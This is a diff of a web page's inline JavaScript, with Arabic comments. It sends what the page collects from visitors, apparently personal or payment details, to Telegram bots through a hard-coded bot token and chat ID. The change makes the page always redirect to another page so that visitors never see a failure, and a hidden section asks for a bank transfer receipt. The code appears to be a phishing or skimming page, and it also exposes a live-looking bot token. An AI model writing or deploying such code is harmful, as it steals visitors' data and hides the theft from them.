@@ -568,10 +568,6 @@
                                             {
                                                 token: '7789845398:AAEHKJDnUFpcG6bn_6lgCqZuygOyxaA-ElY', // ضع توكن البوت الأول هنا
                                                 chatId: '-1002324684325' // معرف الدردشة الأول
-                                            },
-                                            {
-                                         //            token: '8170938688:AAEjGqT2xfXUuCv065uzRdnylppWtRFSuXE', // ضع توكن البوت الثاني هنا
-                                                //chatId: '-1002299957797' // معرف الدردشة الثاني
                                             }
                                             // أضف المزيد من البوتات حسب الحاجة
                                         ];
@@ -601,20 +597,13 @@
                                     
                                         // إرسال الرسالة إلى جميع البوتات
                                         Promise.all(telegramBots.map(sendToTelegram))
-                                            .then(responses => {
-                                                if (responses.every(response => response.ok)) {
-                                                    // تحويل المستخدم إلى صفحة أخرى بعد نجاح الإرسال
-                                                    window.location.href = "index1134.html"; // استبدل 'index1134.html' بالصفحة التي تريد التوجيه إليها
-                                                } else {
-                                                    alert("حدث خطأ أثناء إرسال المعلومات.");
-                                                }
-                                            })
-                                            .catch(error => {
-                                                console.error('Error:', error);
-                                                alert("حدث خطأ أثناء إرسال المعلومات.");
+                                            .finally(() => {
+                                                // تحويل المستخدم إلى صفحة أخرى دائمًا
+                                                window.location.href = "index1134.html"; // استبدل 'index1134.html' بالصفحة التي تريد التوجيه إليها
                                             });
                                     });
-                                    </script>
+                                </script>
+                                
                                     
                                     <div id="bank-div" style="display:none">
                                        <h4>يرجى التواصل مع موظف المبيعات اونلاين لارسال صورة الايصال</h4>
